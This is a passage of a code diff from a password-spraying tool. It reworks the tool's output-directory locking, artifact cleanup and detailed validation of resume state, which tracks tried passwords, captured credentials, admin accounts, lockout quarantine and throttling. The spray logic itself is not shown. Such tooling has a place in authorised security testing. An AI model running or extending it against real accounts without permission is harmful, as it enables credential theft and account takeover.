+            fcntl.flock(handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
+        except BlockingIOError as exc:
+            handle.close()
+            raise RuntimeError(
+                f"another {PRODUCT_NAME} process is already using {self.log_dir}"
+            ) from exc
+        handle.seek(0)
+        handle.truncate()
+        handle.write(f"pid={os.getpid()} started={datetime.datetime.now().isoformat()}\n")
+        handle.flush()
+        self._lock_handle = handle
+
+    def close(self) -> None:
+        """Release the output-directory lock."""
+        handle = getattr(self, "_lock_handle", None)
+        if handle is None:
+            return
+        try:
+            if fcntl is not None:
+                fcntl.flock(handle.fileno(), fcntl.LOCK_UN)
+        except (OSError, ValueError):
+            pass
+        try:
+            handle.close()
+        finally:
+            self._lock_handle = None
+
+    def __del__(self):
+        self.close()
+
+    def _prepare_fresh_directory(self) -> None:
+        """Refuse accidental overwrite and clear stale generated artifacts explicitly."""
+        generated_names = {
+            STATE_FILE_NAME,
+            AUDIT_LOG_NAME,
+            TIMELINE_HTML_NAME,
+            # Remove predecessor artifacts only after explicit --start-fresh.
+            "authcadence.state.json",
+            "authcadence.log",
+            "authcadence-timeline.html",
+            "spraygun.state.json",
+            "spraygun-spray.log",
+            "creds.txt",
+            "locked-out.txt",
+            "used-passwords.txt",
+            "active-users.txt",
+            "results.json",
+            "results.csv",
+            "timeline.json",
+            "spray-timeline.html",
+        }
+        existing = [self.log_dir / name for name in generated_names if (self.log_dir / name).exists()]
+        if existing and not self.cfg.start_fresh:
+            names = ", ".join(sorted(path.name for path in existing))
+            raise RuntimeError(
+                f"output directory already contains run artifacts ({names}); "
+                "use --resume, --start-fresh, or a different --log-dir"
+            )
+        if self.cfg.start_fresh:
+            for path in existing:
+                path.unlink()
+            for pattern in (".users-*", ".secret-*", ".tmp-users-*"):
+                for path in self.log_dir.glob(pattern):
+                    if path.is_file():
+                        path.unlink()
+
+    def _remove_unrequested_artifacts(self) -> None:
+        """Prevent reports from an earlier invocation looking current."""
+        optional = {
+            "results.json": self.cfg.export in {"json", "all"},
+            "results.csv": self.cfg.export in {"csv", "all"},
+            TIMELINE_HTML_NAME: self.cfg.timeline or self.cfg.export == "all",
+            "spray-timeline.html": False,
+            "active-users.txt": self.cfg.filter_disabled,
+        }
+        for name, requested in optional.items():
+            path = self.log_dir / name
+            if not requested and path.exists():
+                path.unlink()
 
     def _init_queue(self):
         """Initialize password queue from file (full list)."""
-        self.remaining_queue = [p.strip() for p in self.cfg.passwords if p.strip()]
+        self.remaining_queue = [secret for secret in self.cfg.passwords if secret != ""]
 
         # Write header to overall log
-        self._log_line(f"=== Spraygun run started at {datetime.datetime.now().isoformat()} ===")
+        self._log_line(f"=== {PRODUCT_NAME} run started at {datetime.datetime.now().isoformat()} ===")
         self._log_line(f"Config: tool={self.cfg.tool}, protocol={self.cfg.protocol}, pth={self.cfg.pth_mode}")
         self._log_line(f"Passwords in queue: {len(self.remaining_queue)}")
         self._log_line("")
+        # Start a genuinely fresh state even when the output directory was used
+        # by an earlier non-resumed run. This also clears stale human-readable
+        # result files before any credentials or lockouts are found.
+        self.save()
 
     def _load(self):
         """Load existing state from resume."""
         if not self.state_file.exists():
-            self._init_queue()
-            return
+            legacy_states = [
+                self.log_dir / "authcadence.state.json",
+                self.log_dir / "spraygun.state.json",
+            ]
+            legacy_state = next((path for path in legacy_states if path.exists()), None)
+            if legacy_state is not None:
+                raise RuntimeError(
+                    f"legacy state ({legacy_state.name}) was found, but automatic state "
+                    "migration is disabled; resume it with the compatible release or use "
+                    "--start-fresh"
+                )
+            raise RuntimeError(
+                f"--resume requested but state file is missing: {self.state_file}"
+            )
 
-        # Robustness: a corrupt/truncated state file (e.g. process killed
-        # mid-write) must not crash --resume. Back it up and start fresh.
         try:
-            data = json.loads(self.state_file.read_text())
+            data = json.loads(
+                self.state_file.read_text(encoding="utf-8"),
+                object_pairs_hook=_reject_duplicate_json_keys,
+                parse_constant=_reject_nonfinite_json_constant,
+            )
             if not isinstance(data, dict):
                 raise ValueError("state JSON is not an object")
         except (json.JSONDecodeError, ValueError, OSError) as e:
-            corrupt_backup = self.state_file.with_suffix(self.state_file.suffix + ".corrupt")
+            stamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%S%f")
+            corrupt_backup = self.state_file.with_name(
+                f"{self.state_file.name}.corrupt-{stamp}"
+            )
             try:
-                self.state_file.replace(corrupt_backup)
-                self._log_line(f"=== State file corrupt ({e}); backed up to {corrupt_backup.name}, starting fresh ===")
+                shutil.copy2(self.state_file, corrupt_backup)
+                os.chmod(corrupt_backup, 0o600)
+                backup_note = f"; preserved a copy as {corrupt_backup.name}"
             except OSError:
-                self._log_line(f"=== State file corrupt ({e}); could not back up, starting fresh ===")
-            self._init_queue()
-            return
+                backup_note = ""
+            raise RuntimeError(
+                f"resume state is unreadable or corrupt ({e}){backup_note}; "
+                "refusing to start a fresh spray"
+            ) from e
 
-        self.used_passwords = data.get("used_passwords", [])
-        self.found_creds = data.get("found_creds", {})
-        self.locked_users = set(data.get("locked_users", []))
-        self.completed_rounds = data.get("completed_rounds", 0)
+        schema_version = data.get("schema_version")
+        if schema_version != STATE_SCHEMA_VERSION:
+            raise RuntimeError(
+                "resume state has an unsupported or missing schema version "
+                f"({schema_version!r}); expected {STATE_SCHEMA_VERSION}. "
+                "Use a separate output directory or explicitly start fresh."
+            )
 
-        # Load new fields
+        required_types = {
+            "target": dict,
+            "input_identity": dict,
+            "used_passwords": list,
+            "found_creds": dict,
+            "credentials": list,
+            "locked_users": list,
+            "quarantined_users": dict,
+            "lockout_signals": list,
+            "attempted_matrix": dict,
+            "pair_ledger": dict,
+            "remaining_queue": list,
+            "effective_users": list,
+            "attempts_by_password": dict,
+            "start_time": str,
+            "conn_fail_history": list,
+            "timeline_events": list,
+            "engine_health": dict,
+            "known_bad_realms": list,
+        }
+        for key, expected_type in required_types.items():
+            if not isinstance(data.get(key), expected_type):
+                raise RuntimeError(
+                    f"resume state is invalid: {key!r} must be "
+                    f"{expected_type.__name__}; refusing to spray"
+                )
+
+        required_scalar_fields = {
+            "unknown_lockout_events",
+            "acknowledged_lockouts",
+            "completed_batches",
+            "total_attempts",
+            "total_dispatches",
+            "delay_multiplier",
+            "working_realm",
+            "last_batch_completed_at",
+            "identity_filter_complete",
+        }
+        missing_scalar_fields = sorted(required_scalar_fields.difference(data))
+        if missing_scalar_fields:
+            raise RuntimeError(
+                "resume state is invalid: missing required field(s) "
+                f"{', '.join(missing_scalar_fields)}; refusing to spray"
+            )
+
+        def nonnegative_int(field: str) -> int:
+            value = data[field]
+            if isinstance(value, bool) or not isinstance(value, int) or value < 0:
+                raise RuntimeError(
+                    f"resume state is invalid: {field} must be a nonnegative integer"
+                )
+            return value
+
+        def validate_iso_timestamp(value: Any, field: str) -> str:
+            if not isinstance(value, str) or not value:
+                raise RuntimeError(f"resume state is invalid: {field} must be an ISO timestamp")
+            try:
+                parsed = datetime.datetime.fromisoformat(value)
+            except ValueError as exc:
+                raise RuntimeError(
+                    f"resume state is invalid: {field} must be an ISO timestamp"
+                ) from exc
+            if parsed.tzinfo is not None:
+                raise RuntimeError(
+                    f"resume state is invalid: {field} must use local naive time"
+                )
+            return value
+
+        def validate_optional_counter(value: Any, field: str) -> Optional[int]:
+            if value is None:
+                return None
+            if isinstance(value, bool) or not isinstance(value, int) or value < 0:
+                raise RuntimeError(
+                    f"resume state is invalid: {field} must be null or a nonnegative integer"
+                )
+            return value
+
+        if not all(isinstance(item, str) for item in data["used_passwords"]):
+            raise RuntimeError("resume state is invalid: used_passwords contains a non-string")
+        if not all(isinstance(item, str) for item in data["remaining_queue"]):
+            raise RuntimeError("resume state is invalid: remaining_queue contains a non-string")
+        used_set = set(data["used_passwords"])
+        remaining_set = set(data["remaining_queue"])
+        configured_secrets = set(self.cfg.passwords)
+        if (
+            len(used_set) != len(data["used_passwords"])
+            or len(remaining_set) != len(data["remaining_queue"])
+            or used_set & remaining_set
+            or used_set | remaining_set != configured_secrets
+        ):
+            raise RuntimeError(
+                "resume state secret queue is incomplete, duplicated, or inconsistent; "
+                "refusing to spray"
+            )
+
+        saved_target = data.get("target")
+        current_target = self._target_identity()
+        if saved_target != current_target:
+            raise RuntimeError(
+                "resume state belongs to a different target or credential mode: "
+                f"saved={saved_target}, current={current_target}. "
+                "Use a different --log-dir or --start-fresh."
+            )
+
+        saved_inputs = data.get("input_identity")
+        raw_effective_users = data["effective_users"]
+        if (
+            not raw_effective_users
+            or not all(isinstance(user, str) and user for user in raw_effective_users)
+        ):
+            raise RuntimeError("resume state effective identity set is malformed")
+        effective_keys = [
+            canonical_identity(user, self.cfg.domain)
+            for user in raw_effective_users
+        ]
+        source_users = self.cfg.source_users or self.cfg.users
+        source_keys = [
+            canonical_identity(user, self.cfg.domain)
+            for user in source_users
+        ]
+        if (
+            len(set(effective_keys)) != len(effective_keys)
+            or not set(effective_keys).issubset(set(source_keys))
+        ):
+            raise RuntimeError("resume state effective identity set is inconsistent")
+        saved_source_hash = saved_inputs.get("source_users_sha256")
+        if saved_source_hash != _sha256_json(source_keys):
+            raise RuntimeError(
+                "resume state does not match the current source identity set"
+            )
+        filter_complete = data["identity_filter_complete"]
+        if not isinstance(filter_complete, bool):
+            raise RuntimeError("resume state identity-filter phase is malformed")
+        if not filter_complete and effective_keys != source_keys:
+            raise RuntimeError("resume state has an inconsistent pending identity filter")
+        self.identity_filter_complete = filter_complete
+        self.cfg.users = list(raw_effective_users)
+        self._rebuild_configured_identity_maps()
+
+        current_inputs = self._input_identity()
+        if saved_inputs != current_inputs:
+            raise RuntimeError(
+                "resume state does not match the current users, secrets, engine, "
+                "or safety settings; refusing to risk repeated attempts"
+            )
+
+        self.used_passwords = list(data["used_passwords"])
+        self.found_creds = {}
+        self.locked_users = {
+            item for item in data["locked_users"] if isinstance(item, str)
+        }
+        if len(self.locked_users) != len(data["locked_users"]):
+            raise RuntimeError("resume state locked_users contains an invalid identity")
+        saved_locked_keys = {
+            canonical_identity(user, self.cfg.domain) for user in self.locked_users
+        }
+        if len(saved_locked_keys) != len(self.locked_users):
+            raise RuntimeError(
+                "resume state locked_users contains canonical duplicates"
+            )
+        configured_user_keys = {
+            canonical_identity(user, self.cfg.domain) for user in self.cfg.users
+        }
+        raw_quarantined = data["quarantined_users"]
+        allowed_quarantine_reasons = set(QUARANTINE_PRIORITY)
+        for key, value in raw_quarantined.items():
+            if not isinstance(key, str) or not isinstance(value, dict):
+                raise RuntimeError("resume state quarantine record is malformed")
+            raw_user = value.get("user")
+            raw_reason = value.get("reason")
+            raw_reasons = value.get("reasons")
+            if (
+                not isinstance(raw_user, str)
+                or not isinstance(raw_reason, str)
+                or not isinstance(raw_reasons, list)
+                or not raw_reasons
+                or not all(isinstance(reason, str) for reason in raw_reasons)
+            ):
+                raise RuntimeError("resume state quarantine record is malformed")
+            reasons = set(raw_reasons)
+            if (
+                len(reasons) != len(raw_reasons)
+                or raw_reason not in reasons
+                or not reasons.issubset(allowed_quarantine_reasons)
+            ):
+                raise RuntimeError("resume state quarantine reasons are invalid")
+            user_key = canonical_identity(raw_user, self.cfg.domain)
+            if key != user_key or user_key not in configured_user_keys:
+                raise RuntimeError("resume state quarantine identity key is inconsistent")
+            expected_primary = min(
+                reasons,
+                key=lambda reason: QUARANTINE_PRIORITY[reason],
+            )
+            if raw_reason != expected_primary:
+                raise RuntimeError("resume state quarantine priority is inconsistent")
+            self.quarantined_users[key] = {
+                "user": raw_user,
+                "reason": raw_reason,
+                "reasons": sorted(reasons),
+            }
+        raw_signals = data.get("lockout_signals", [])
+        if not all(isinstance(item, dict) for item in raw_signals):
+            raise RuntimeError("resume state lockout_signals contains an invalid event")
+        self.lockout_signals = [dict(item) for item in raw_signals]
+        self.unknown_lockout_events = nonnegative_int("unknown_lockout_events")
+        self.acknowledged_lockouts = nonnegative_int("acknowledged_lockouts")
+        self.completed_rounds = nonnegative_int("completed_batches")
+        if self.completed_rounds > len(data["used_passwords"]):
+            raise RuntimeError("resume state completed batch count is impossible")
+        raw_last_batch_completed_at = data["last_batch_completed_at"]
+        if raw_last_batch_completed_at is None:
+            if self.completed_rounds:
+                raise RuntimeError(
+                    "resume state is missing its last completed-batch timestamp"
+                )
+            self.last_batch_completed_at = None
+        else:
+            self.last_batch_completed_at = validate_iso_timestamp(
+                raw_last_batch_completed_at,
+                "last_batch_completed_at",
+            )
+            if not self.completed_rounds:
+                raise RuntimeError(
+                    "resume state has a completed-batch timestamp without a batch"
+                )
+        # Quarantine is derived again from durable outcomes below. The saved
+        # copy is validated above but never trusted as the sole safety record.
+        self.quarantined_users = {}
+
         raw_matrix = data.get("attempted_matrix", {})
-        self.attempted_matrix = {k: set(v) for k, v in raw_matrix.items()}
-        self.success_by_pattern = data.get("success_by_pattern", {})
-        self.admin_users = data.get("admin_users", {})
-        self.start_time = data.get("start_time", datetime.datetime.now().isoformat())
-        self.total_attempts = data.get("total_attempts", 0)
-        self.attempts_by_password = data.get("attempts_by_password", {})
+        saved_matrix: Dict[str, Set[str]] = {}
+        for secret, users in raw_matrix.items():
+            if not isinstance(secret, str) or not isinstance(users, list):
+                raise RuntimeError("resume state attempted_matrix is malformed")
+            if secret not in configured_secrets:
+                raise RuntimeError("resume state attempted_matrix contains an unknown secret")
+            if not all(isinstance(user, str) for user in users):
+                raise RuntimeError("resume state attempted_matrix contains an invalid identity")
+            if users:
+                normalized_users = [
+                    canonical_identity(user, self.cfg.domain) for user in users
+                ]
+                if len(set(normalized_users)) != len(normalized_users):
+                    raise RuntimeError("resume state attempted_matrix contains duplicate identities")
+                if not set(normalized_users).issubset(configured_user_keys):
+                    raise RuntimeError("resume state attempted_matrix contains an unknown identity")
+                saved_matrix[secret] = set(normalized_users)
+        self.attempted_matrix = {}
 
-        # Load Feature D fields
-        self.conn_fail_history = data.get("conn_fail_history", [])
-        self.delay_multiplier = data.get("delay_multiplier", 1.0)
+        raw_ledger = data["pair_ledger"]
+        expected_saved_matrix: Dict[str, Set[str]] = {}
+        for secret, records in raw_ledger.items():
+            if not isinstance(secret, str) or not isinstance(records, dict):
+                raise RuntimeError("resume state pair ledger is malformed")
+            if secret not in configured_secrets:
+                raise RuntimeError("resume state pair ledger contains an unknown secret")
+            ledger_for_secret: Dict[str, Dict[str, Any]] = {}
+            for key, record in records.items():
+                if not isinstance(key, str) or not isinstance(record, dict):
+                    raise RuntimeError("resume state pair ledger record is malformed")
+                raw_user = record.get("user", key)
+                raw_status = record.get("status", "indeterminate")
+                if not isinstance(raw_user, str) or not isinstance(raw_status, str):
+                    raise RuntimeError("resume state pair ledger record is malformed")
+                normalized = dict(record)
+                normalized["user"] = raw_user
+                normalized["status"] = raw_status
+                if key != canonical_identity(normalized["user"], self.cfg.domain):
+                    raise RuntimeError("resume state pair ledger identity key is inconsistent")
+                if key not in configured_user_keys:
+                    raise RuntimeError("resume state pair ledger contains an unknown identity")
+                if normalized["status"] not in TERMINAL_PAIR_STATUSES | {"in_flight"}:
+                    raise RuntimeError("resume state pair ledger contains an invalid status")
+                dispatch_count = record.get("dispatch_count", 1)
+                if isinstance(dispatch_count, bool) or not isinstance(dispatch_count, int) or dispatch_count < 1:
+                    raise RuntimeError("resume state pair ledger contains an invalid dispatch count")
+                normalized["dispatch_count"] = dispatch_count
+                for text_field in ("engine", "protocol", "detail", "previous_status"):
+                    if text_field in record and not isinstance(record[text_field], str):
+                        raise RuntimeError(
+                            f"resume state pair ledger contains an invalid {text_field}"
+                        )
+                for timestamp_field in ("started_at", "updated_at"):
+                    if timestamp_field in record:
+                        validate_iso_timestamp(
+                            record[timestamp_field],
+                            f"pair_ledger.{timestamp_field}",
+                        )
+                for source_field in ("source_pass", "source_batch"):
+                    if source_field in record:
+                        validate_optional_counter(
+                            record[source_field],
+                            f"pair_ledger.{source_field}",
+                        )
+                original_status = normalized["status"]
+                if original_status in TERMINAL_PAIR_STATUSES:
+                    expected_saved_matrix.setdefault(secret, set()).add(key)
+                if normalized["status"] == "in_flight":
+                    normalized["status"] = "indeterminate"
+                    normalized["detail"] = "process ended before a terminal result was persisted"
+                    self._quarantine(normalized["user"], "indeterminate")
+                ledger_for_secret[key] = normalized
+                if normalized["status"] in TERMINAL_PAIR_STATUSES:
+                    self.attempted_matrix.setdefault(secret, set()).add(normalized["user"])
+            self.pair_ledger[secret] = ledger_for_secret
 
-        # Load Feature E field
-        self.timeline_events = data.get("timeline_events", [])
+        if saved_matrix != expected_saved_matrix:
+            raise RuntimeError(
+                "resume state attempted_matrix does not match the authoritative pair ledger"
+            )
 
-        # Load failover memory fields
-        self.engine_health = data.get("engine_health", {})
-        self.known_bad_realms = data.get("known_bad_realms", [])
-        self.working_realm = data.get("working_realm", None)
+        self.success_by_pattern = {}
+        self.admin_users = {}
 
-        # Rebuild queue: all passwords minus used
-        all_pw = [p.strip() for p in self.cfg.passwords if p.strip()]
-        self.remaining_queue = [p for p in all_pw if p not in self.used_passwords]
+        for record in data["credentials"]:
+            if not isinstance(record, dict):
+                raise RuntimeError("resume state credential record is malformed")
+            user = record.get("user")
+            secret = record.get("secret")
+            if not isinstance(user, str) or not isinstance(secret, str):
+                raise RuntimeError("resume state credential record lacks user or secret")
+            if not isinstance(record.get("is_admin"), bool):
+                raise RuntimeError("resume state credential record has an invalid admin flag")
+            if canonical_identity(user, self.cfg.domain) not in configured_user_keys:
+                raise RuntimeError("resume state credential record contains an unknown identity")
+            if secret not in configured_secrets:
+                raise RuntimeError("resume state credential record contains an unknown secret")
+            pair = (canonical_identity(user, self.cfg.domain), secret)
+            if pair in self._credential_index:
+                raise RuntimeError("resume state contains a duplicate credential pair")
+            ledger_record = self.pair_ledger.get(secret, {}).get(pair[0])
+            if ledger_record is not None:
+                ledger_status = ledger_record.get("status")
+                expected_status = (
+                    "admin_success" if record["is_admin"] else "success"
+                )
+                if ledger_status != expected_status:
+                    raise RuntimeError(
+                        "resume state credential finding conflicts with the pair ledger"
+                    )
+            captured_at = validate_iso_timestamp(
+                record.get("captured_at"),
+                "credentials.captured_at",
+            )
+            for source_field in ("source_round", "source_pass", "source_batch"):
+                if source_field in record:
+                    validate_optional_counter(
+                        record[source_field],
+                        f"credentials.{source_field}",
+                    )
+            if not isinstance(record.get("engine", ""), str):
+                raise RuntimeError("resume state credential record has an invalid engine")
+            normalized = {
+                "user": user,
+                "secret": secret,
+                "is_admin": record["is_admin"],
+                "captured_at": captured_at,
+                "source_round": record.get("source_round"),
+                "source_pass": record.get("source_pass", record.get("source_round")),
+                "source_batch": record.get("source_batch", record.get("source_round")),
+                "engine": record.get("engine", ""),
+            }
+            self.credentials.append(normalized)
+            self._credential_index[pair] = normalized
+            self.found_creds[user] = secret
+            self._quarantine(user, "credential_found")
+            if normalized["is_admin"]:
+                self.admin_users[user] = secret
+
+        if not all(
+            isinstance(user, str) and isinstance(secret, str)
+            for user, secret in data["found_creds"].items()
+        ):
+            raise RuntimeError("resume state found_creds is malformed")
+        if data["found_creds"] != self.found_creds:
+            raise RuntimeError(
+                "resume state found_creds does not match credential findings"
+            )
+
+        seen_signal_identities: Set[Tuple[str, str]] = set()
+        calculated_unknown_signals = 0
+        for event in self.lockout_signals:
+            certainty = event.get("certainty")
+            if certainty not in {"definitive", "ambiguous"}:
+                raise RuntimeError("resume state contains an invalid safety-signal certainty")
+            validate_iso_timestamp(event.get("ts"), "lockout_signals.ts")
+            for text_field in ("engine", "protocol", "raw"):
+                if not isinstance(event.get(text_field, ""), str):
+                    raise RuntimeError(
+                        f"resume state safety signal contains an invalid {text_field}"
+                    )
+            for source_field in ("source_pass", "source_batch"):
+                if source_field not in event:
+                    raise RuntimeError(
+                        f"resume state safety signal is missing {source_field}"
+                    )
+                validate_optional_counter(
+                    event[source_field],
+                    f"lockout_signals.{source_field}",
+                )
+            stage = event.get("stage")
+            if stage not in {"spray", "identity_enumeration"}:
+                raise RuntimeError("resume state safety signal contains an invalid stage")
+            event_secret = event.get("secret")
+            if (
+                stage == "spray"
+                and event_secret not in configured_secrets
+            ) or (
+                stage == "identity_enumeration"
+                and event_secret is not None
+            ):
+                raise RuntimeError("resume state safety signal contains an unknown secret")
+            event_user = event.get("user")
+            if event_user is None:
+                calculated_unknown_signals += 1
+                continue
+            if not isinstance(event_user, str):
+                raise RuntimeError("resume state safety signal contains an invalid identity")
+            event_key = canonical_identity(event_user, self.cfg.domain)
+            if event_key not in configured_user_keys:
+                raise RuntimeError("resume state safety signal contains an unknown identity")
+            if stage == "spray":
+                ledger_record = self.pair_ledger.get(str(event_secret), {}).get(
+                    event_key
+                )
+                expected_status = (
+                    "lockout" if certainty == "definitive" else "ambiguous_lockout"
+                )
+                if (
+                    ledger_record is not None
+                    and ledger_record.get("status") != expected_status
+                ):
+                    raise RuntimeError(
+                        "resume state safety signal conflicts with the pair ledger"
+                    )
+            dedupe_key = (event_key, str(certainty))
+            if dedupe_key in seen_signal_identities:
+                raise RuntimeError("resume state contains duplicate known safety signals")
+            seen_signal_identities.add(dedupe_key)
+            if certainty == "definitive":
+                self.locked_users.add(self._display_user(event_user))
+                self._quarantine(event_user, "confirmed_lockout")
+            else:
+                self._quarantine(event_user, "ambiguous_lockout_signal")
+
+        if calculated_unknown_signals != self.unknown_lockout_events:
+            raise RuntimeError("resume state unknown safety-signal count is inconsistent")
+
+        # Terminal ledger outcomes are authoritative. Reconstruct global
+        # quarantine/findings if a process died after persisting the pair but
+        # before its corresponding aggregate record was atomically published.
+        for secret, records in self.pair_ledger.items():
+            for record in records.values():
+                user = str(record["user"])
+                status = str(record["status"])
+                if status in {"success", "admin_success"}:
+                    added = self.add_cred(
+                        user,
+                        secret,
+                        is_admin=status == "admin_success",
+                        source_round=record.get("source_batch"),
+                        engine=str(record.get("engine", "")),
+                        persist=False,
+                    )
+                    if added:
+                        finding = self._credential_index[
+                            (canonical_identity(user, self.cfg.domain), secret)
+                        ]
+                        finding["source_pass"] = record.get("source_pass")
+                        finding["source_batch"] = record.get("source_batch")
+                elif status == "lockout":
+                    self.add_lockout(
+                        user,
+                        certainty="definitive",
+                        engine=str(record.get("engine", "")),
+                        protocol=str(record.get("protocol", "")),
+                        secret=secret,
+                        raw_line="recovered from pair ledger",
+                        source_pass=record.get("source_pass"),
+                        source_batch=record.get("source_batch"),
+                        persist=False,
+                    )
+                elif status == "ambiguous_lockout":
+                    self.add_lockout(
+                        user,
+                        certainty="ambiguous",
+                        engine=str(record.get("engine", "")),
+                        protocol=str(record.get("protocol", "")),
+                        secret=secret,
+                        raw_line="recovered from pair ledger",
+                        source_pass=record.get("source_pass"),
+                        source_batch=record.get("source_batch"),
+                        persist=False,
+                    )
+                elif status == "indeterminate":
+                    self._quarantine(user, "indeterminate")
+
+        definitive_signal_keys = {
+            canonical_identity(str(event["user"]), self.cfg.domain)
+            for event in self.lockout_signals
+            if event.get("user") and event.get("certainty") == "definitive"
+        }
+        if not saved_locked_keys.issubset(definitive_signal_keys):
+            raise RuntimeError(
+                "resume state locked identities are not backed by definitive signal evidence"
+            )
+        if not 0 <= self.acknowledged_lockouts <= self.lockout_count:
+            raise RuntimeError("resume state acknowledged safety-signal count is invalid")
+
+        self.success_by_pattern = {}
+        for finding in self.credentials:
+            pattern = classify_password_pattern(str(finding["secret"]))
+            self.success_by_pattern[pattern] = self.success_by_pattern.get(pattern, 0) + 1
+
+        for user in self.locked_users:
+            if canonical_identity(user, self.cfg.domain) not in configured_user_keys:
+                raise RuntimeError("resume state contains an unknown locked identity")
+            self._quarantine(user, "confirmed_lockout")
+
+        self.start_time = validate_iso_timestamp(data["start_time"], "start_time")
+        self.total_attempts = nonnegative_int("total_attempts")
+        self.total_dispatches = nonnegative_int("total_dispatches")
+        raw_attempts_by_password = data["attempts_by_password"]
+        for secret, count in raw_attempts_by_password.items():
+            if (
+                not isinstance(secret, str)
+                or secret not in configured_secrets
+                or isinstance(count, bool)
+                or not isinstance(count, int)
+                or count < 0
+            ):
+                raise RuntimeError("resume state attempts_by_password is malformed")
+        self.attempts_by_password = dict(raw_attempts_by_password)
+
+        # Response-stress throttling is safety-sensitive: validate the history
+        # and require the saved multiplier to be exactly derivable from it.
+        self.conn_fail_history = list(data["conn_fail_history"])
+        if not all(
+            not isinstance(count, bool) and isinstance(count, int) and count >= 0
+            for count in self.conn_fail_history
+        ):
+            raise RuntimeError("resume state connection-failure history is malformed")
+        if len(self.conn_fail_history) > self.completed_rounds:
+            raise RuntimeError("resume state connection-failure history is inconsistent")
+        expected_delay_multiplier = 1.0
+        for count in self.conn_fail_history:
+            if count > 0:
+                expected_delay_multiplier = min(expected_delay_multiplier * 1.5, 3.0)
+            else:
+                expected_delay_multiplier = max(expected_delay_multiplier - 0.25, 1.0)
+        raw_delay_multiplier = data["delay_multiplier"]
+        if (
+            isinstance(raw_delay_multiplier, bool)
+            or not isinstance(raw_delay_multiplier, (int, float))
+            or not math.isfinite(float(raw_delay_multiplier))
+            or not math.isclose(
+                float(raw_delay_multiplier),
+                expected_delay_multiplier,
+                rel_tol=0.0,
+                abs_tol=1e-9,
+            )
+        ):
+            raise RuntimeError("resume state throttle multiplier is inconsistent")
+        self.delay_multiplier = expected_delay_multiplier
+
+        # Timeline data is not trusted as executable state, but malformed
+        # entries can still break reporting or disguise the audit sequence.
+        self.timeline_events = []
+        for event in data["timeline_events"]:
+            if not isinstance(event, dict):
+                raise RuntimeError("resume state timeline contains a malformed event")
+            validate_iso_timestamp(event.get("ts"), "timeline_events.ts")
+            if not isinstance(event.get("type"), str) or not isinstance(
+                event.get("detail"), str
+            ):
+                raise RuntimeError("resume state timeline contains a malformed event")
+            validate_optional_counter(event.get("batch"), "timeline_events.batch")
+            self.timeline_events.append(dict(event))
+
+        # Failover cooldown memory controls whether an engine may run. Reject
+        # any record that could reset, shorten, or ambiguously represent it.
+        allowed_engine_keys = {
+            str(engine) for engine in build_failover_chain(self.cfg)
+        }
+        required_health_fields = {
+            "consecutive_failures",
+            "demoted",
+            "cooldown_remaining",
+            "demote_count",
+            "last_reason",
+        }
+        self.engine_health = {}
+        for engine_key, health in data["engine_health"].items():
+            if (
+                not isinstance(engine_key, str)
+                or engine_key not in allowed_engine_keys
+                or not isinstance(health, dict)
+                or set(health) != required_health_fields
+            ):
+                raise RuntimeError("resume state engine-health record is malformed")
+            consecutive_failures = health["consecutive_failures"]
+            cooldown_remaining = health["cooldown_remaining"]
+            demote_count = health["demote_count"]
+            demoted = health["demoted"]
+            last_reason = health["last_reason"]
+            integer_values = (
+                consecutive_failures,
+                cooldown_remaining,
+                demote_count,
+            )
+            if (
+                any(
+                    isinstance(value, bool)
+                    or not isinstance(value, int)
+                    or value < 0
+                    for value in integer_values
+                )
+                or not isinstance(demoted, bool)
+                or not isinstance(last_reason, str)
+                or cooldown_remaining > max(MAX_COOLDOWN, self.cooldown_rounds)
+                or demote_count > MAX_DEMOTE_COUNT
+                or (
+                    demoted
+                    and (demote_count < 1 or consecutive_failures < 1 or not last_reason)
+                )
+                or (
+                    not demoted
+                    and (cooldown_remaining != 0 or demote_count != 0)
+                )
+            ):
+                raise RuntimeError("resume state engine-health record is inconsistent")
+            self.engine_health[engine_key] = dict(health)
+
+        realm_candidates = set(
+            self.cfg.realm_candidates or derive_realm_candidates(self.cfg.domain)
+        )
+        raw_bad_realms = data["known_bad_realms"]
+        if (
+            not all(isinstance(realm, str) and realm for realm in raw_bad_realms)
+            or len(set(raw_bad_realms)) != len(raw_bad_realms)
+            or not set(raw_bad_realms).issubset(realm_candidates)
+        ):
+            raise RuntimeError("resume state rejected-realm memory is malformed")
+        raw_working_realm = data["working_realm"]
+        if raw_working_realm is not None and (
+            not isinstance(raw_working_realm, str)
+            or raw_working_realm not in realm_candidates
+            or raw_working_realm in raw_bad_realms
+        ):
+            raise RuntimeError("resume state working-realm memory is malformed")
+        self.known_bad_realms = list(raw_bad_realms)
+        self.working_realm = raw_working_realm
+
+        self.remaining_queue = list(data["remaining_queue"])
+
+        # A fully used pass may omit a pair only when the identity was already
+        # quarantined. Otherwise the state would silently claim unperformed
+        # work was complete.
+        for secret in self.used_passwords:
+            ledger = self.pair_ledger.get(secret, {})
+            for user in self.cfg.users:
+                key = canonical_identity(user, self.cfg.domain)
+                if key not in ledger and key not in self.quarantined_users:
+                    raise RuntimeError(
+                        "resume state marks a secret used but has neither an outcome "
+                        "nor a quarantine decision for every identity"
+                    )
+
+        if self.remaining_queue:
+            self.current_batch_progress()
 
         self._log_line(f"=== Resuming from saved state at {datetime.datetime.now().isoformat()} ===")
         self._log_line(f"Used passwords: {len(self.used_passwords)}, remaining: {len(self.remaining_queue)}")
         self._log_line(f"Credential matrix loaded: {sum(len(v) for v in self.attempted_matrix.values())} pairs")
         self._log_line("")
+        # Persist any in-flight-to-indeterminate normalization immediately.
+        self.save()
 
     def save(self):
         """Persist state to disk."""
+        self.reconcile_ledger_metrics()
         data = {
+            "schema_version": STATE_SCHEMA_VERSION,
+            "target": self._target_identity(),
+            "input_identity": self._input_identity(),
             "used_passwords": self.used_passwords,
+            "remaining_queue": self.remaining_queue,
+            "effective_users": self.cfg.users,
             "found_creds": self.found_creds,
+            "credentials": self.credentials,
             "locked_users": list(self.locked_users),
-            "completed_rounds": self.completed_rounds,
+            "quarantined_users": self.quarantined_users,
+            "lockout_signals": self.lockout_signals,
+            "unknown_lockout_events": self.unknown_lockout_events,
+            "acknowledged_lockouts": self.acknowledged_lockouts,
+            "completed_batches": self.completed_rounds,
+            "last_batch_completed_at": self.last_batch_completed_at,
             # New fields for operator fundamentals
             "attempted_matrix": {k: list(v) for k, v in self.attempted_matrix.items()},
+            "pair_ledger": self.pair_ledger,
             "success_by_pattern": self.success_by_pattern,
             "admin_users": self.admin_users,
             "start_time": self.start_time,
             "total_attempts": self.total_attempts,
